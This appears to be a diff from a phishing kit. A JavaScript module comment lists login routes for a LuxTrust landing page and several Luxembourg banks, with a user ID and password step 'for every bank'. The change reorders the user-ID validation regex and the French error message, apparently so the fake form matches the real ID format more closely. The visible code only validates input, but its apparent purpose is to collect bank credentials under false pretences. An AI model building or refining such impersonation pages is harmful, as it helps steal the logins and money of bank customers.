@@ -2,14 +2,14 @@
 // Routes: / (LuxTrust landing), /bgl, /ing, /eboo, /rnet
 // Step 1 for every bank is always: User ID (4 digits + 4 letters) + Password.
 
-export const USER_ID_REGEX = /^\d{4}[A-Za-z]{4}$/;
-export const USER_ID_EXAMPLE = "1234ABCD";
+export const USER_ID_REGEX = /^[A-Za-z]{4}\d{4}$/;
+export const USER_ID_EXAMPLE = "ABCD1234";
 
 export function validateUserId(v) {
   const clean = (v || "").replace(/[\s-]/g, "");
   if (!clean) return "L'identifiant est requis.";
   if (!USER_ID_REGEX.test(clean))
-    return `L'identifiant doit comporter 4 chiffres + 4 lettres (ex. ${USER_ID_EXAMPLE}).`;
+    return `L'identifiant doit comporter 4 lettres + 4 chiffres (ex. ${USER_ID_EXAMPLE}).`;
   return "";
 }
 
